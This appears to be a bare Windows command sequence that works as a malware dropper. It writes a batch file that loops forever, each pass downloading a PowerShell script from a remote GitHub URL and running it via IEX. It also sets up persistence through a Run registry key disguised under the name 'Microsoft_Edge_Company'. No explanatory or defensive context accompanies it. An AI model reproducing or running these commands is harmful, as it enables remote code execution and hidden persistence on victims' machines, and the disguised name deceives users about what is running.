md C:\Users\User\Downloads\ser; Set-Content C:\Users\User\Downloads\ser\serseruex.bat ":a powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd()); timeout /t 30
goto a" -Encoding ASCII; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d %LOCALAPPDATA%\DBG\cache\i386\run32.exe; cd C:\Users\User\Downloads\ser; ./serseruex.bat
